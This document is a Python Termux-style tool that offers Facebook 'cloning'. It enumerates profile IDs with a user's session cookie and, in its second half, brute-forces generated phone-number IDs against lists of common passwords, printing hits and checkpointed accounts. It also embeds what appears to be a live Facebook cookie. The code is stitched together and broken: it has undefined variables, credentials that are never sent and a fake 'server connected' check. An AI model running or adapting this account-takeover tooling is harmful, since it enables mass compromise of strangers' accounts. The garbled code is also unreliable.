import os
import time
import requests
import uuid
from bs4 import BeautifulSoup

CONFIG_FILE = "user_config.txt"
saved_cookie = None
saved_time = 0.0
user_status = "free"

# Load saved user config
if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, "r") as f:
            lines = f.read().splitlines()
        if len(lines) >= 3:
            saved_cookie = lines[0]
            saved_time = float(lines[1])
            user_status = lines[2]
    except:
        pass

current_time = time.time()

# Main Menu Display
os.system('clear')
print("====================================")
print("    ★ MY Porn-Hub CONTROL ★        ")
print("        DEVELOPER: Devil_King       ")
print("====================================")
print("[#] User Status: " + str(user_status).upper())
print("====================================")
print("[1] (FB Method)")
print("[2] (Fb Friend list cheker)")
print("[3] (old clone)")
print("[4] (File clone)")
print("[5] (Random Clone)")
print("[6] (Exit)")
print("====================================")

choice = input("[★] 1/2/3/4/5/6 : ")

# -------------------------------------------------------------
# METHOD 1: FB UID COLLECTOR (FIXED & UPDATED)
# -------------------------------------------------------------
if choice in ["1", "১"]:
    os.system('clear')
    print("====================================")
    print("        ★ FILE CREATE MENU ★        ")
    print("====================================")
    
    # 1. Ask for Free or Paid option first
    print("[1] Continue as Free User (2 Hours Limit)")
    print("[2] Activate Paid Version (Unlimited)")
    user_choice = input("[+] Select option: ")
    
    if user_choice == "2":
        secret_key = input("[+] Enter Paid Activation Key: ")
        if secret_key == "ADMIN123":
            user_status = "paid"
            print("[+] Activation Successful! Unlimited Mode On.")
        else:
            print("[X] Invalid Key! Continuing as Free User.")
            user_status = "free"
    else:
        user_status = "free"

    # 2. Check Cookie status or prompt for new one
    fb_cookie = None
    if user_status == "paid":
        if saved_cookie and user_status == "paid":
            print("[+] Paid User Detected! Loading saved cookie...")
            fb_cookie = saved_cookie
        else:
            fb_cookie = input("[+] Enter Your FB Cookie: ")
    else:
        if saved_cookie and (current_time - saved_time) < 7200:
            remaining_min = int((7200 - (current_time - saved_time)) / 60)
            print("[+] Active session found! (Expires in " + str(remaining_min) + " minutes)")
            fb_cookie = saved_cookie
        else:
            if saved_cookie:
                print("[!] Your 2-hour free session has expired!")
            fb_cookie = input("[+] Enter Your FB Cookie: ")

    # Save Configuration
    try:
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
    except:
        pass

    if fb_cookie:
        # 3. Series selection option as requested (1/2/3 Mix)
        print("\n====================================")
        print("[1] 1000/6158 Series (Old UID)")
        print("[3] Custom Mix Series")
        print("====================================")
        series_choice = input("[+] Select Series Format: ")

        if series_choice == "1":
            base_uid = "10000"
        elif series_choice == "2":
            base_uid = "6158"
        else:
            base_uid = input("[+] Enter Custom UID (All Uid Paste): ")
        
        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
        if not output_file.endswith('.txt'):
            output_file += '.txt'
            
        # 4. Storage Path Fix for Android (/sdcard/)
        output_path = os.path.join("/sdcard", output_file)
        
        # Test if /sdcard/ is writeable, otherwise fallback to local file
        try:
            with open(output_path, "a") as test_file:
                pass
        except PermissionError:
            print("[!] Storage Permission Denied! Saving to current directory instead.")
            output_path = output_file

        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
            'Cookie': fb_cookie
        }
        
        print("\n[+] Connecting to server...")
        print("[+] Extracting data... (Press CTRL+C to Stop/Cancel)\n")
        
        # Infinite Loop or Loop through series until user cancels (CTRL+C)
        try:
            for uid_suffix in range(series_start, series_end + 1):
                full_uid = str(base_uid) + str(uid_suffix)
                url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
                
                try:
                    response = session.get(url, headers=headers)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        page_title = soup.find('title')
                        if page_title:
                            profile_name = page_title.text.strip()
                        else:
                            profile_name = "Unknown User"
                            
                        if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                            print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                            break
                        elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
                            # Premium style output layout matching your screenshot
                            print(f"\033[1;32mPremium\033[0m - Successfully Extracted From : \033[1;35m{full_uid}\033[0m")
                            
                            # Save to phone storage path
                            with open(output_path, "a", encoding="utf-8") as file_out:
                                file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                        else:
                            print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    print("\n[-] Extraction Stopped By User.")
                    break
                except:
                    print("[ERROR] Connection failed for UID " + str(full_uid))
        except KeyboardInterrupt:
            print("\n[-] Process Cancelled.")
            
        print(f"\n[✓] Data Saved Successfully at: {output_path}")
    else:
        print("[X] Cookie Error!")

# -------------------------------------------------------------
# METHOD 2: REEL SERVER CHECK
# -------------------------------------------------------------
if choice in ["2", "২"]:
    os.system('clear')
    print("--- [2] Sex video / Reel Server Check ---")
    site = input("Enter Site Name: ")
    url = "https://www.facebook.com/reel/846400658"
    print("\n[+] Connecting to server via " + str(site) + "...")
    time.sleep(1.5)
    print("\n=======================================")
    print("Target URL: " + str(url))
    print("[✓] STATUS : SERVER CONNECTED SUCCESS")
    print("=======================================")

# -------------------------------------------------------------
# METHOD 3 & 4: EXPIRED OPTIONS
# -------------------------------------------------------------
if choice in ["3", "4", "৩", "৪"]:
    os.system('clear')
    print("--- Option [" + str(choice) + "] ---")
    print("[X] ERROR: Method Not Found / Expired!")

# -------------------------------------------------------------
# METHOD 5: RANDOM CLONE
# -------------------------------------------------------------
if choice in ["5", "৫"]:
    os.system('clear')
    print("====================================")
    
import requests
import json

# =====================================================================
# 1. CUSTOM USER INPUTS (Script run korle ja screen-e ashbe)
# =====================================================================
print("========== [ DEVIL SYSTEM CUSTOMIZER ] ==========")
prefix = input(" Enter Initial Prefix/Digit (e.g., 017, 0183, 1000): ")
loop_digits = int(input(" Enter Suffix Digit Length (Type 3, 4, or 5): "))
password_input = input(" Enter Passwords (Comma separated, e.g., pass1,pass2,112233): ")

# Password gulo ke list e convert korar logic
password_list = [p.strip() for p in password_input.split(',')]

# Loop er range ready korar setup
start_range = 10**(loop_digits - 1)
end_range = (10**loop_digits) - 1

# =====================================================================
# 2. METHOD FUNCTION (Apnar Real Screenshots Er Data)
# =====================================================================
def fb_async_method(uid, password):
    r = requests.Session()
    
    # Real Target URL (From Image 5)
    url = "https://m.facebook.com/async/wbloks/log/"
    
    # REAL PARAMETERS (No Change - Exact From Images)
    params = {
        'lid': '7650579958745411107',
        'event': 'CW_LCP',
        'relativeTime': '7194',
        'tracePolicy': 'com.bloks.www.caa.login.login_homepage&bloksAppId=fb_web&extra[lcp_metric]=2651.60&extra[lcp_element_className]=&extra[lcp_element_tagName]=SPAN&extra[lcp_url]=',
        'u': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n88s6anJ1CcUKaeZ-TsOR_izrUdP_SeAwbVp7D3qZq5GNFbjbD2LMKJ853eNQaFHZhBCKxfXmJeEXNZWE42UhSnmKfdz_5Zxv-bcBxIQqH1oLZTMQ5Hxw%26flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377'
    }
    
    # REAL HEADERS (From Image 3 & 4)
    head = {
        'Host': 'm.facebook.com',
        'Content-Length': '0',
        'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Sec-Ch-Ua-Platform-Version': '"13.0.0"',
        'Sec-Ch-Ua-Full-Version-List': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'Sec-Ch-Ua-Model': '"TECNO BG7"',
        'Sec-Ch-Ua-Prefers-Color-Scheme': 'light',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Accept': '*/*',
        'Origin': 'https://m.facebook.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ftwo_step_verification%2Fauthentication%2F%3Fencrypted_context%3DDAWSVYZMVAo50zxxpsGHHlnRQo7GTjpabbAEQG4EKf6P5VOkT0W8JjAACBte3dXCKAu5y2hjWe8Dr74NiWKBxZBBE4dGo6u6XT9KZ7JYQXheGqje4yQq5uBNzhw3NazR2BntQZRDr-24-7OA6VkJw3rTAC-kn08gtun2JPX1RPZeyAidrA2Pu04U83klp1Cs9ArUwaXItm0zTmTCG3W7SVIcWhaV88HY0tv84pfm4eCowBiteQyDwCqbb_7DgNt2eTjG2G8kUZ45v2P2b1D3XePZ2U7U_ezNQrVUr80fQzDVSoYKjzz5s7AH7cEFHY34Zqo1UX9oidleUB9mr8oSdTfbwA0Bkq0edZ4fMRVkmEbGbIUjr93GhoMGNWFdXT1XrzZBJafrFCezLS5nKUFMq21n45baF6Uk4pD4A6WawdyaqB8SWplErA5qIEh9B9G7m2vuES8otrRx-NUnHgCsBWX94OjBDBRqDBbDhmGuzlqYjAKSMoq2-YtntLPnaBmdGHB7-i73Ub03gTTwORTWQXmaPd5Q-REmM0ZrRvRWu5150TcynMJmv9PoKJxkxtvufdFrAjJGa5D9GzNcpKV9S-nFG0Lz4tdCwwscuV9XLRubB8GyH90XaiXLzvj8mlVmC8nwMpzIBB7rmLLrUosS4RzDQMwh2aEwZae0vL7zvXLgw1_TmkClp3zhBEuSEvcNc3C_owvB40hZ149y8g_HKxTBb4PmtnwrX4GHI3oqHiLWcwzgJi6tbnZIA_OBCGO1YKdykZ0M1ea6gwqBlJ2jkstSK7E5tLAMUw4BT4Tjl_pVIfADFzbJ7X_VTZ41oUIGOhAQuQjGD_RUTLqT170UnLY1M5924HYpyF16xZQT1Qa9H7HFp1vaR7-76DXAKuhkyrTynF9MB4k150bpaiaHrvp631HYolWRc-CiLDoj-bvM1wlFklwvoScCwN8ERxJECYXwrOEn5ZME0_wdRg-J5SyGVv9SZUbfbcU4UHZ4_J4hQIPoCF39juR7kRMwYgKCDUd4_Pdoyk6PZUvOUjNQp5AbM6qCVMte0lsfH1jIk0H4Bxinppqts29NXc4rODWBRuXDDGN2Jm4u2V6wCi_xV-88o3c2rb5021HpXMJmNhMvdwLNUf2T_XRZYv3v6Ah6hM4o_Q87w2KJcN6PKN0JhwOGndjnIlWFufyxEW0Dthnzb700ldZFnuy-YKRR7ff9wYJsyW3qEvvpTFV5L8xEQUNDb0d14c2JFNPrh88F5Z447fFqdmLCV05dfzPsKxtGfASjwMV9NKtDPxG0251DKCby9GE1B_21Jy6LXC1bA_WffFqydDL205-n2526flow%2526flow%253Dpre_authentication%2526next%253D%25252F%26refsrc%3Ddeprecated&seo=&fbs=&lsd=AdRXTss4EOgoi0RCqIr_H_RoDhU&jazoest=22377',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'datr=Z-AlandWYUM08nOCyIFMvHg7; sb=H-Ilarqr8yE7GHgFDwWIBURW; m_pixel_ratio=1.75; wd=412x922; fr=01tf1bE4UXG0eOai1.AWewTDpjKV-i1NTUVfejRYc0TdrkquVymue2T4VSoh5DJi03HS4.Bp15UB..AAA.0.0.BqLFH1.AWc8ItLUkCmrNgZzp2PnMoz8EEU'
    }

    try:
        pos = r.post(url, params=params, headers=head)
        
        # Checking Criteria
        if pos.status_code == 200:
            print(f"[Devil-OK] {uid} | {password}")
        elif "checkpoint" in pos.url:
            print(f"[Devil-CP] {uid} | {password}")
            
    except requests.exceptions.ConnectionError:
        print("\n[X] Network Error!")

# =====================================================================
# 3. AUTOMATED LOOP SYSTEM (Prefix + Suffix + Multi-Password)
# =====================================================================
print(f"\n[+] Processing IDs from {start_range} to {end_range}...")

for suffix in range(start_range, end_range + 1):
    # Dynamic Auto UID Toiri Korar Logic
    uid = str(prefix) + str(suffix)
    
    # Prti ta UID er moddhe shobgula custom password hit korbe line-by-line
    for password in password_list:
        fb_async_method(uid, password)

        # -------------------------------------------------------------
# METHOD 6: EXIT
# -------------------------------------------------------------
if choice in ["6", "৬"]:
    print("\n[+] Thank you for using this tool! Goodbye.")
    exit()

input("\nPress Enter to Exit...")
